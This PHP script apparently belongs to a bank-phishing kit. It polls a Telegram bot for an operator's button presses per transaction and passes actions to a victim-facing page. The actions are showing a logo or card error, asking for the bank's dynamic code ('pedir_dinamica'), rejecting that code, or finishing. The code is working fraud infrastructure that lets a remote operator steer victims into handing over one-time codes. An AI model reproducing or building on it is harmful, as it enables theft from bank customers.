<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$action = null;

// Verificar si ya hay acción en sesión
if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $action = $_SESSION['current_action'];

    unset($_SESSION['current_transaction']);
    unset($_SESSION['current_action']);
}

// Si no hay acción, buscar en Telegram
if (!$action) {
    $offset = $_SESSION['last_update_id'] ?? 0;

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (!empty($data['ok']) && isset($data['result'])) {
        foreach ($data['result'] as $update) {
            if (
                isset($update['callback_query']['data']) &&
                strpos($update['callback_query']['data'], $transactionId) !== false
            ) {
                // Marcar el update como procesado
                $_SESSION['last_update_id'] = $update['update_id'];

                $callbackData = $update['callback_query']['data'];
                $parts = explode(':', $callbackData);

                if (count($parts) === 2) {
                    $actionType = $parts[0];
                    $validActions = ['error_logo', 'error_cajero', 'pedir_dinamica', 'error_dinamica', 'confirm_finalizar'];

                    if (in_array($actionType, $validActions)) {
                        $action = $actionType;

                        // Eliminar los botones del mensaje original
                        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageReplyMarkup");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                            'chat_id' => $config['chat_id'],
                            'message_id' => $messageId,
                            'reply_markup' => json_encode(['inline_keyboard' => []])
                        ]));
                        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                        curl_exec($ch);
                        curl_close($ch);
                    }
                }

                break;
            }
        }
    }
}

// Devolver resultado
echo json_encode(['action' => $action]);
